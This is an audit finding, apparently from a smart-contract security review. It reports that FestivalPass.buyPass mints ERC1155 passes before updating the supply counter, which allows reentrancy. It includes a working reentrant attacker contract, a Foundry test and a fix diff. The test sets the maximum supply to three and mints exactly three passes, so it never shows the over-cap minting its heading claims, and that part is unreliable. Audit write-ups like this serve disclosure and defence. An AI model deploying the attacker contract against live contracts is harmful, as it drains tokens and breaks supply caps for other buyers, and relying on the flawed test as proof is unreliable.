### [Medium] buyPass Lacks Reentrancy Protection, Allowing Minting Beyond Maximum Pass Supply

**Affected Files:** src/FestivalPass.sol

**Description**

`buyPass` violates the Checks-Effects-Interactions pattern: `_mint` is called before `++passSupply`. ERC1155's `_mint` triggers `onERC1155Received` on any contract recipient. An attacker contract can call `buyPass` again from inside `onERC1155Received` — at that moment `passSupply` has not yet been incremented, so the supply check passes again, minting additional passes beyond the cap.

```solidity
function buyPass(uint256 collectionId) external payable {
    require(collectionId == GENERAL_PASS || collectionId == VIP_PASS || collectionId == BACKSTAGE_PASS);
    require(msg.value == passPrice[collectionId], "Incorrect payment amount");
@>  require(passSupply[collectionId] < passMaxSupply[collectionId], "Max supply reached");
    // passSupply is NOT updated until after the mint below

@>  _mint(msg.sender, collectionId, 1, ""); // triggers onERC1155Received — passSupply still stale
@>  ++passSupply[collectionId];              // CEI violated: state update after external call
    ...
}
```

**Impact**

- The hard supply cap for all three tiers is bypassable, breaking scarcity for legitimate buyers.
- Each extra BACKSTAGE pass minted through reentrancy triggers an additional 15e18 BEAT welcome bonus.

**Proof of Concept**

```solidity
contract ReentrancyAttacker {
    FestivalPass public festivalPass;
    uint256 public passId;
    uint256 public price;
    uint256 public depth;

    constructor(address _festivalPass, uint256 _passId, uint256 _price) {
        festivalPass = FestivalPass(_festivalPass);
        passId = _passId;
        price = _price;
    }

    function attack(uint256 _depth) external payable {
        depth = _depth;
        festivalPass.buyPass{value: price}(passId);
    }

    function onERC1155Received(
        address, address, uint256, uint256, bytes memory
    ) external returns (bytes4) {
        if (depth > 0 && address(this).balance >= price) {
            depth--;
            festivalPass.buyPass{value: price}(passId); // passSupply unchanged — passes again
        }
        return this.onERC1155Received.selector;
    }

    receive() external payable {}
}

function test_BuyPassReentrancy() public {
    vm.prank(organizer);
    festivalPass.configurePass(3, 0.25 ether, 3);

    ReentrancyAttacker attacker = new ReentrancyAttacker(address(festivalPass), 3, 0.25 ether);
    vm.deal(address(attacker), 0.75 ether);

    attacker.attack(2); // re-enters twice — 3 total mints

    assertEq(festivalPass.balanceOf(address(attacker), 3), 3);
    assertEq(beatToken.balanceOf(address(attacker)), 45e18); // 3 × 15e18 bonus
}
```

**Recommended Mitigation**

```diff
  function buyPass(uint256 collectionId) external payable {
      require(collectionId == GENERAL_PASS || collectionId == VIP_PASS || collectionId == BACKSTAGE_PASS);
      require(msg.value == passPrice[collectionId], "Incorrect payment amount");
      require(passSupply[collectionId] < passMaxSupply[collectionId], "Max supply reached");

+     ++passSupply[collectionId]; // effect before interaction

      _mint(msg.sender, collectionId, 1, "");

-     ++passSupply[collectionId];
      ...
  }
```

